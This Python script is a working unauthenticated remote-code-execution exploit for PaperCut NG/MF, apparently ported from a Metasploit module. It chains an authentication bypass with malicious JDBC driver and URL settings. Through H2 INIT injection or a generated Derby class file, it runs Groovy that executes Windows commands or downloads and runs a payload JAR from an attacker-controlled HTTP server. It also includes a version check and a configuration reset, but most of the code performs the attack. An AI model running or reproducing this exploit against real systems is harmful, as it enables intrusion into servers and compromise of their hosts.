#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PaperCut NG/MF unauthenticated RCE verification tool
CVE-2026-81578 (Tapestry complex-direct auth bypass) + CVE-2026-82078 (RCE via external user lookup)

Python re-implementation of the Rapid7 / Metasploit module:
  exploit/multi/http/papercut_ng_external_user_lookup_rce

- Standard library only: no requests, no urllib3, no javac needed.
- Exploit modes:
    --win-command   execute a Windows command on the target
    --jar           serve a Java payload JAR over HTTP and execute it on the target
- The 24/25 Derby bootstrap class is generated in-memory (same patch contract as
  Metasploit.class: "\\x00\\x0aMetasploit" -> class name, "\\x00\\x07PAYLOAD" -> base64 source).

Authorized testing only. The exploit temporarily changes the target's external
user-lookup configuration and restores factory defaults afterwards.
"""

import argparse
import base64
import http.client
import http.server
import os
import re
import secrets
import socketserver
import ssl as _ssl
import string
import struct
import sys
import threading
import urllib.parse
import zipfile

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'

VERSION_RE = re.compile(
    r'PaperCut (?P<product>NG|MF)\s+'
    r'(?P<release>\d+\.\d+\.\d+)'
    r'(?:-[0-9A-Za-z-]+(?:\.[0-9A-Za-z-]+)*)?'
    r'\s+\(Build\s+(?P<build>\d+)\)'
)

# Fixed (patched) versions per product line and major version: (major, minor, patch, build)
FIXED = {
    'MF': {24: (24, 1, 9, 76515), 25: (25, 0, 12, 76509), 26: (26, 0, 4, 76507)},
    'NG': {24: (24, 1, 9, 76516), 25: (25, 0, 12, 76510), 26: (26, 0, 4, 76508)},
}

CODE_TAG = {'VULNERABLE': '[+]', 'DETECTED': '[*]', 'SAFE': '[-]', 'UNKNOWN': '[-]'}


class ExploitError(Exception):
    pass


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _u1(x):
    return bytes([x & 0xff])


def _u2(x):
    return struct.pack('>H', x & 0xffff)


def _u4(x):
    return struct.pack('>I', x & 0xffffffff)


def rand_alpha_lower(n):
    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(n))


def rand_alpha(n):
    return ''.join(secrets.choice(string.ascii_letters) for _ in range(n))


def rand_alnum(n):
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(n))


def read_main_class(jar_path):
    try:
        with zipfile.ZipFile(jar_path) as z:
            manifest = z.read('META-INF/MANIFEST.MF').decode('utf-8', 'replace')
        m = re.search(r'^Main-Class:\s*(\S+)', manifest, re.MULTILINE)
        return m.group(1) if m else None
    except Exception:
        return None


# --------------------------------------------------------------------------- #
# minimal HTTP client (cookies + form posts), stdlib only
# --------------------------------------------------------------------------- #
class Response(object):
    __slots__ = ('status', 'text')

    def __init__(self, status, text):
        self.status = status
        self.text = text


class HttpClient(object):
    def __init__(self, host, port, use_ssl, verify, timeout):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.verify = verify
        self.timeout = timeout
        self.cookies = {}

    def _connection(self):
        if self.use_ssl:
            ctx = _ssl.create_default_context() if self.verify else _ssl._create_unverified_context()
            return http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=self.timeout)
        return http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)

    def request(self, method, uri, params=None, data=None, headers=None):
        target = uri
        if params:
            qs = urllib.parse.urlencode(params)
            target = uri + ('&' if '?' in uri else '?') + qs

        hdrs = {
            'User-Agent': UA,
            'Accept': '*/*',
            'Connection': 'close',
        }
        if self.cookies:
            hdrs['Cookie'] = '; '.join('%s=%s' % (k, v) for k, v in self.cookies.items())
        if headers:
            hdrs.update(headers)

        body = None
        if data is not None:
            if isinstance(data, dict):
                body = urllib.parse.urlencode(data)
                hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
            else:
                body = data

        try:
            conn = self._connection()
            conn.request(method, target, body=body, headers=hdrs)
            resp = conn.getresponse()
            status = resp.status
            resp_headers = resp.getheaders()
            raw = resp.read()
            resp.close()
            conn.close()
        except (http.client.HTTPException, OSError, _ssl.SSLError):
            return None

        for k, v in resp_headers:
            if k.lower() == 'set-cookie':
                pair = v.split(';', 1)[0].strip()
                if '=' in pair:
                    name, val = pair.split('=', 1)
                    self.cookies[name.strip()] = val.strip()

        return Response(status, raw.decode('utf-8', 'replace'))


# --------------------------------------------------------------------------- #
# Derby bootstrap class generator (Java classfile, no javac)
# --------------------------------------------------------------------------- #
class _ClassBuilder(object):
    def __init__(self):
        self.pool = []
        self.utf8_map = {}
        self.cls_map = {}

    def add(self, tag, data):
        self.pool.append(bytes([tag]) + data)
        return len(self.pool)

    def utf8(self, s):
        if s in self.utf8_map:
            return self.utf8_map[s]
        b = s.encode('utf-8')
        idx = self.add(1, _u2(len(b)) + b)
        self.utf8_map[s] = idx
        return idx

    def cls(self, name):
        if name in self.cls_map:
            return self.cls_map[name]
        idx = self.add(7, _u2(self.utf8(name)))
        self.cls_map[name] = idx
        return idx

    def string(self, utf8_idx):
        return self.add(8, _u2(utf8_idx))

    def name_and_type(self, name, desc):
        return self.add(12, _u2(self.utf8(name)) + _u2(self.utf8(desc)))

    def methodref(self, class_name, method_name, desc):
        return self.add(10, _u2(self.cls(class_name)) + _u2(self.name_and_type(method_name, desc)))

    def fieldref(self, class_name, field_name, desc):
        return self.add(9, _u2(self.cls(class_name)) + _u2(self.name_and_type(field_name, desc)))


def _build_bootstrap_class():
    """A Java class with only a static initializer that decodes base64 Groovy
    source and evaluates it via groovy.util.Eval.me (mirrors the H2 alias)."""
    b = _ClassBuilder()

    this_cls = b.cls('Metasploit')
    obj_cls = b.cls('java/lang/Object')
    obj_init = b.methodref('java/lang/Object', '<init>', '()V')

    str_cls = b.cls('java/lang/String')
    str_init = b.methodref('java/lang/String', '<init>', '([BLjava/nio/charset/Charset;)V')

    getdec = b.methodref('java/util/Base64', 'getDecoder', '()Ljava/util/Base64$Decoder;')
    pay_str = b.string(b.utf8('PAYLOAD'))
    decode = b.methodref('java/util/Base64$Decoder', 'decode', '(Ljava/lang/String;)[B')

    utf8_field = b.fieldref('java/nio/charset/StandardCharsets', 'UTF_8', 'Ljava/nio/charset/Charset;')

    eval_str = b.string(b.utf8('groovy/util/Eval'))
    forname = b.methodref('java/lang/Class', 'forName', '(Ljava/lang/String;)Ljava/lang/Class;')
    me_str = b.string(b.utf8('me'))
    getmethod = b.methodref('java/lang/Class', 'getMethod',
                            '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;')
    invoke = b.methodref('java/lang/reflect/Method', 'invoke',
                         '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;')
    throw = b.cls('java/lang/Throwable')

    code = bytearray()
    code += b'\x13' + _u2(pay_str)      # ldc_w PAYLOAD
    code += b'\xb8' + _u2(getdec)       # invokestatic Base64.getDecoder()
    code += b'\xb6' + _u2(decode)       # invokevirtual Decoder.decode(String)[B
    code += b'\x4c'                    # astore_1
    code += b'\xb2' + _u2(utf8_field)   # getstatic StandardCharsets.UTF_8
    code += b'\x4d'                    # astore_2
    code += b'\xbb' + _u2(str_cls)      # new String
    code += b'\x59'                    # dup
    code += b'\x2b'                    # aload_1
    code += b'\x2c'                    # aload_2
    code += b'\xb7' + _u2(str_init)     # invokespecial String.<init>([B,Charset)V
    code += b'\x4e'                    # astore_3
    code += b'\x13' + _u2(eval_str)     # ldc_w "groovy/util/Eval"
    code += b'\xb8' + _u2(forname)      # invokestatic Class.forName(String)Class
    code += b'\x13' + _u2(me_str)       # ldc_w "me"
    code += b'\x04'                    # iconst_1
    code += b'\xbd' + _u2(b.cls('java/lang/Class'))   # anewarray Class
    code += b'\x59'                    # dup
    code += b'\x03'                    # iconst_0
    code += b'\x13' + _u2(str_cls)      # ldc_w String.class
    code += b'\x53'                    # aastore
    code += b'\xb6' + _u2(getmethod)    # invokevirtual Class.getMethod(String,Class[])Method
    code += b'\x01'                    # aconst_null
    code += b'\x04'                    # iconst_1
    code += b'\xbd' + _u2(obj_cls)      # anewarray Object
    code += b'\x59'                    # dup
    code += b'\x03'                    # iconst_0
    code += b'\x2e'                    # aload_3
    code += b'\x53'                    # aastore
    code += b'\xb6' + _u2(invoke)       # invokevirtual Method.invoke(Object,Object[])Object
    code += b'\x57'                    # pop
    code += b'\xb1'                    # return
    handler = len(code)
    code += b'\x4b'                    # astore_0
    code += b'\xb1'                    # return
    code = bytes(code)

    init_code = b'\x2a\xb7' + _u2(obj_init) + b'\xb1'

    def method(acc, name, desc, c, max_stack, max_locals, exc):
        code_attr = _u2(b.utf8('Code')) + _u4(12 + len(c) + 8 * len(exc))
        code_attr += _u2(max_stack) + _u2(max_locals) + _u4(len(c)) + c
        code_attr += _u2(len(exc))
        for s, e, h, ct in exc:
            code_attr += _u2(s) + _u2(e) + _u2(h) + _u2(ct)
        code_attr += _u2(0)
        return _u2(acc) + _u2(b.utf8(name)) + _u2(b.utf8(desc)) + _u2(1) + code_attr

    init_method = method(0x0001, '<init>', '()V', init_code, 1, 1, [])
    clinit_method = method(0x0008, '<clinit>', '()V', code, 8, 4, [(0, handler, handler, throw)])

    out = bytearray()
    out += b'\xca\xfe\xba\xbe'
    out += _u2(0) + _u2(49)            # Java 5 classfile: legacy verifier, no StackMapTable needed
    out += _u2(len(b.pool) + 1)
    for p in b.pool:
        out += p
    out += _u2(0x0021)                 # ACC_PUBLIC | ACC_SUPER
    out += _u2(this_cls)
    out += _u2(obj_cls)
    out += _u2(0)                      # interfaces
    out += _u2(0)                      # fields
    out += _u2(2)                      # methods
    out += init_method
    out += clinit_method
    out += _u2(0)                      # class attributes
    return bytes(out)


_BOOTSTRAP_TEMPLATE = _build_bootstrap_class()


def patch_bootstrap_class(class_name, source):
    encoded = base64.b64encode(source.encode('utf-8')).decode('ascii')
    if len(encoded) > 0xffff:
        raise ExploitError('The generated Groovy bootstrap is too large')

    data = _BOOTSTRAP_TEMPLATE
    if b'\x00\x0aMetasploit' not in data or b'\x00\x07PAYLOAD' not in data:
        raise ExploitError('Bootstrap class is missing its patch placeholders')
    data = data.replace(b'\x00\x0aMetasploit', _u2(len(class_name)) + class_name.encode(), 1)
    data = data.replace(b'\x00\x07PAYLOAD', _u2(len(encoded)) + encoded.encode(), 1)
    return data


# --------------------------------------------------------------------------- #
# Java payload JAR HTTP server
# --------------------------------------------------------------------------- #
class JarPayloadHandler(http.server.BaseHTTPRequestHandler):
    payload_file = None

    def do_GET(self):
        self._serve(True)

    def do_HEAD(self):
        self._serve(False)

    def _serve(self, include_body):
        if self.path != '/' + os.path.basename(self.payload_file):
            self.send_error(404)
            return
        with open(self.payload_file, 'rb') as f:
            data = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'application/java-archive')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        if include_body:
            self.wfile.write(data)

    def log_message(self, fmt, *args):
        pass


class ThreadingHTTPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


# --------------------------------------------------------------------------- #
# exploit
# --------------------------------------------------------------------------- #
class PaperCutExploit(object):
    def __init__(self, host, port=9191, target_uri='/app', use_ssl=False,
                 verify=False, verbose=False, timeout=10):
        if not target_uri.startswith('/'):
            target_uri = '/' + target_uri

        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.verify = verify
        self.verbose = verbose
        self.timeout = timeout
        self.target_uri = target_uri

        scheme = 'https' if use_ssl else 'http'
        self.base = '%s://%s:%d' % (scheme, host, port)
        self.url = self.base + self.target_uri
        self.origin = self.base + '/'

        self.http = HttpClient(host, port, use_ssl, verify, timeout)
        self._papercut_info = None

    # -- logging ------------------------------------------------------------ #
    def log(self, msg):
        print('[*] ' + msg)

    def vlog(self, msg):
        if self.verbose:
            print('[*] ' + msg)

    def warn(self, msg):
        print('[!] ' + msg)

    # -- Tapestry complex-direct bypass (CVE-2026-81578) -------------------- #
    def _complex_direct_request(self, component_page, component_path, data=None, method='POST'):
        service = 'direct/%s/Home/%s/%s' % (rand_alpha_lower(8), component_page, component_path)
        headers = {'Origin': self.origin, 'Referer': self.url}
        return self.http.request(method, self.target_uri,
                                 params={'service': service},
                                 data=data,
                                 headers=headers)

    @staticmethod
    def home_response(resp):
        return resp is not None and resp.status == 200 and '<!-- Page: Home -->' in resp.text

    # -- discovery / check -------------------------------------------------- #
    def papercut_info(self):
        if self._papercut_info is not None:
            return self._papercut_info

        resp = self.http.request('GET', self.target_uri, params={'service': 'page/Error'})
        if resp is None:
            return {'status': 'unreachable', 'message': 'The target did not respond.'}
        if not (resp.status == 200 and '<!-- Page: Error -->' in resp.text):
            return {'status': 'not_found', 'message': 'The target did not return the expected page.'}

        m = VERSION_RE.search(resp.text)
        if not m:
            return {'status': 'version_unknown',
                    'message': 'PaperCut was detected, but its version could not be determined.'}

        release = m.group('release')
        build = int(m.group('build'))
        version = tuple([int(x) for x in release.split('.')] + [build])

        self._papercut_info = {
            'status': 'success',
            'product': m.group('product'),
            'version': version,
            'major': int(release.split('.')[0]),
        }
        return self._papercut_info

    def check(self):
        info = self.papercut_info()

        if info['status'] == 'unreachable':
            return 'UNKNOWN', info['message']
        if info['status'] == 'not_found':
            return 'SAFE', info['message']
        if info['status'] == 'version_unknown':
            return 'DETECTED', info['message']

        product = info['product']
        version = info['version']
        major = info['major']
        vs = 'PaperCut %s %s' % (product, '.'.join(map(str, version)))

        if major <= 23:
            return 'DETECTED', vs + ' (23.x and below unsupported by vendor; exploitability unconfirmed)'
        if major > 26:
            return 'SAFE', vs + ' (newer than affected versions)'

        fixed = FIXED[product][major]
        if version < fixed:
            return 'VULNERABLE', vs + ' - vulnerable (fixed in %s)' % '.'.join(map(str, fixed))
        return 'SAFE', vs + ' - patched'

    # -- config editing / lookup trigger ------------------------------------ #
    def update_config_option(self, name, value):
        if not self.home_response(self._complex_direct_request(
            'ConfigEditor',
            'quickFindForm',
            {
                'sp': 'S0',
                'Form0': '$TextField,doQuickFind,clear',
                '$TextField': name,
                'doQuickFind': 'Go',
            },
        )):
            return False

        if name == 'user-lookup.id-to-username-sql':
            fields = {
                'sp': 'S1',
                'Form1': '$TextField$0,$Submit,$Submit$0,$TextField$0$0,$Submit$1,$Submit$0$0',
                '$TextField$0': value,
                '$TextField$0$0': 'USERNAME',
                '$Submit': 'Update',
            }
        else:
            fields = {
                'sp': 'S1',
                'Form1': '$TextField$0,$Submit,$Submit$0',
                '$TextField$0': value,
                '$Submit': 'Update',
            }

        return self.home_response(self._complex_direct_request('ConfigEditor', '$Form', fields))

    def trigger_external_lookup(self, card_number):
        return self._complex_direct_request(
            'UserList',
            '$QuickFind.$Form',
            {
                'sp': 'S0',
                'Form0': '$TextField,$Submit,$Submit$0',
                '$TextField': card_number,
                '$Submit': 'Go',
            },
        )

    # -- Groovy source generators ------------------------------------------- #
    def groovy_command_source(self, command):
        # Base64 keeps quotes and metacharacters out of the nested HTTP form, JDBC
        # URL, SQL and Groovy quoting layers.
        encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
        cmd_var = rand_alpha_lower(8)
        result = rand_alpha_lower(8)

        return (
            'def %s = new String(\n'
            '  java.util.Base64.getDecoder().decode("%s"),\n'
            '  java.nio.charset.StandardCharsets.UTF_8\n'
            ')\n'
            'new ProcessBuilder(["cmd.exe","/d","/s","/c",%s] as String[]).start()\n'
            '"%s"'
        ) % (cmd_var, encoded, cmd_var, result)

    def groovy_class_loader_source(self, jar_uri, main_class):
        u = rand_alpha_lower(8)
        l = rand_alpha_lower(8)
        c = rand_alpha_lower(8)
        result = rand_alpha_lower(8)

        return (
            'def %s = new URL("jar:%s!/")\n'
            'def %s = new URLClassLoader([%s] as URL[])\n'
            'def %s = %s.loadClass("%s")\n'
            'Thread.startDaemon {\n'
            '  Thread.currentThread().setContextClassLoader(%s)\n'
            '  %s.main(new String[0])\n'
            '}\n'
            '"%s"'
        ) % (u, jar_uri, l, u, c, l, main_class, l, c, result)

    @staticmethod
    def h2_statement(source):
        return "CREATE ALIAS PCEXEC FOR 'groovy.util.Eval.me(java.lang.String)';CALL PCEXEC('%s')" % source

    @staticmethod
    def h2_escape(statement):
        return statement.replace('\\', '\\\\').replace(';', '\\;')

    # -- Java payload HTTP service ------------------------------------------ #
    def start_jar_service(self, jar_path, lhost, lport):
        JarPayloadHandler.payload_file = jar_path
        server = ThreadingHTTPServer((lhost, lport), JarPayloadHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.log('Serving payload JAR on http://%s:%d/%s' %
                 (lhost, lport, os.path.basename(jar_path)))
        return server

    # -- main ------------------------------------------------------------------ #
    def exploit(self, command=None, jar_path=None, main_class=None,
                lhost=None, lport=8080):
        if (command is None) == (jar_path is None):
            raise ExploitError('Specify exactly one of: a Windows command or a payload JAR')

        info = self.papercut_info()
        if info['status'] == 'unreachable':
            raise ExploitError('The target did not respond.')
        if info['status'] in ('not_found', 'version_unknown'):
            raise ExploitError('The target did not provide a usable version: %s' % info['message'])

        # The forged listener renders Home, so initialize that stateful Tapestry page
        # in the session before submitting ConfigEditor forms.
        home = self.http.request('GET', self.target_uri)
        if not self.home_response(home):
            raise ExploitError('The target did not return the PaperCut Home page')

        jar_server = None

        try:
            if jar_path is not None:
                if not os.path.isfile(jar_path):
                    raise ExploitError('JAR payload not found: %s' % jar_path)
                if not main_class:
                    main_class = read_main_class(jar_path)
                if not main_class:
                    raise ExploitError('No Main-Class found in JAR manifest; pass --main-class')
                if not lhost:
                    raise ExploitError('--lhost is required when serving a payload JAR')

                jar_server = self.start_jar_service(jar_path, lhost, lport)
                jar_uri = 'http://%s:%d/%s' % (lhost, lport, os.path.basename(jar_path))
                groovy_source = self.groovy_class_loader_source(jar_uri, main_class)
            else:
                groovy_source = self.groovy_command_source(command)

            bootstrap_class_name = None

            if info['major'] >= 26:
                self.log('PaperCut %s detected; using H2 to execute Groovy bootstrap'
                         % '.'.join(map(str, info['version'])))

                driver = 'org.h2.Driver'
                url = 'jdbc:h2:mem:%s;INIT=%s' % (
                    rand_alpha_lower(8),
                    self.h2_escape(self.h2_statement(groovy_source)),
                )

                if len(url) > 1024:
                    raise ExploitError(
                        "The generated H2 JDBC URL exceeds PaperCut's 1,024-character "
                        'config limit (len=%d)' % len(url)
                    )

                # The lookup SQL must still contain {cardnumber}. Payload execution
                # already happened while H2 processed INIT.
                sql = 'VALUES CAST({cardnumber} AS VARCHAR(32672))'
                lookup_value = rand_alnum(16)
            else:
                self.log('PaperCut %s detected; using Derby to drop and load a Java class '
                         'and execute Groovy bootstrap' % '.'.join(map(str, info['version'])))

                bootstrap_class_name = rand_alpha(secrets.choice(range(8, 17)))
                csv_path = 'tmp/%s.csv' % rand_alpha_lower(8)
                class_path = 'lib/%s.class' % bootstrap_class_name

                # Delete the temporary .csv and .class artifacts even if the bootstrap raises.
                groovy_source = (
                    'try {\n  %s\n} finally {\n'
                    '  new java.io.File("%s").delete()\n'
                    '  new java.io.File("%s").delete()\n'
                    '}'
                ) % (groovy_source, class_path, csv_path)

                class_bytes = patch_bootstrap_class(bootstrap_class_name, groovy_source)

                driver = 'org.apache.derby.jdbc.EmbeddedDriver'
                url = 'jdbc:derby:memory:%s;create=true' % rand_alpha_lower(8)

                # PaperCut replaces {cardnumber} with a bound parameter, which is the
                # nested query whose BLOB result Derby writes to class_path.
                sql = ("CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE"
                       "({cardnumber}, '%s', NULL, NULL, NULL, '%s')") % (csv_path, class_path)

                lookup_value = "VALUES CAST(X'%s' AS BLOB)" % class_bytes.hex()
                groovy_source = groovy_source  # (kept for clarity)

            # Only these four settings are needed by either strategy (CVE-2026-82078).
            exploit_config = [
                ('user-lookup.db-driver', driver),
                ('user-lookup.db-url', url),
                ('user-lookup.id-to-username-sql', sql),
                ('user-lookup.enabled', 'Y'),
            ]

            self.log('Setting config...')
            for name, value in exploit_config:
                self.vlog('Setting %s - %s' % (name, value))
                if not self.update_config_option(name, value):
                    raise ExploitError('Failed to update %s' % name)

            self.log('Triggering the external user lookup')
            res = self.trigger_external_lookup(lookup_value)
            if not self.home_response(res):
                self.warn('The lookup request did not return a Home response; '
                          'the payload may still have executed')

            if bootstrap_class_name:
                # Stop calling the export procedure before loading the new class.
                # DatabaseUtils invokes Class.forName on the configured driver before
                # opening the connection, executing the bootstrap static initializer.
                if not self.update_config_option(
                    'user-lookup.id-to-username-sql',
                    'VALUES CAST({cardnumber} AS VARCHAR(32672))'
                ):
                    raise ExploitError('Failed to reset the lookup query')

                if not self.update_config_option('user-lookup.db-driver', bootstrap_class_name):
                    raise ExploitError('Failed to select the bootstrap class')

                self.log('Triggering second-stage lookup (loading %s)' % bootstrap_class_name)
                self.trigger_external_lookup(rand_alnum(16))

        finally:
            # The bypass can submit ConfigEditor forms but cannot render that protected
            # page to read prior values. Restore factory defaults, disabling lookup
            # first to minimize the time any partial configuration remains live.
            self.log('Resetting config...')
            factory_config = [
                ('user-lookup.enabled', 'N'),
                ('user-lookup.id-to-username-sql',
                 'select user_name from users_table where card_number = {cardnumber}'),
                ('user-lookup.db-url', ''),
                ('user-lookup.db-driver', ''),
            ]
            for name, value in factory_config:
                self.vlog('Resetting %s - %s' % (name, value))
                if not self.update_config_option(name, value):
                    self.warn('Failed to update %s' % name)

            if jar_server is not None:
                jar_server.shutdown()


def main(argv=None):
    parser = argparse.ArgumentParser(
        description='PaperCut NG/MF unauthenticated RCE verification tool '
                    '(CVE-2026-81578 + CVE-2026-82078). Standard library only.'
    )
    parser.add_argument('host', help='PaperCut host')
    parser.add_argument('-p', '--port', type=int, default=9191)
    parser.add_argument('--target-uri', default='/app')
    parser.add_argument('--ssl', action='store_true', help='target service is HTTPS')
    parser.add_argument('--verify', action='store_true',
                        help='verify TLS certificates (default: disabled)')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--check', action='store_true',
                        help='only run the read-only version check (default when no command given)')

    payload = parser.add_mutually_exclusive_group()
    payload.add_argument('--win-command', metavar='CMD', help='Windows command to execute')
    payload.add_argument('--jar', metavar='FILE',
                         help='Java payload JAR to serve over HTTP and execute')

    parser.add_argument('--main-class', help='Main-Class for --jar (default: read from manifest)')
    parser.add_argument('--lhost', help='bind address for the built-in JAR HTTP server '
                                        '(required with --jar)')
    parser.add_argument('--lport', type=int, default=8080)

    args = parser.parse_args(argv)

    ex = PaperCutExploit(args.host, args.port, args.target_uri, args.ssl,
                         args.verify, args.verbose, args.timeout)

    if not (args.win_command or args.jar):
        code, msg = ex.check()
        print('%s %s' % (CODE_TAG.get(code, '[*]'), msg))
        return 0

    # Informational check first, then run.
    code, msg = ex.check()
    print('%s %s' % (CODE_TAG.get(code, '[*]'), msg))

    try:
        if args.jar:
            if not args.lhost:
                print('[-] --lhost is required when serving a payload JAR')
                return 1
            ex.exploit(jar_path=args.jar, main_class=args.main_class,
                       lhost=args.lhost, lport=args.lport)
        else:
            ex.exploit(command=args.win_command)
    except ExploitError as e:
        print('[-] %s' % e)
        return 1

    return 0


if __name__ == '__main__':
    sys.exit(main())
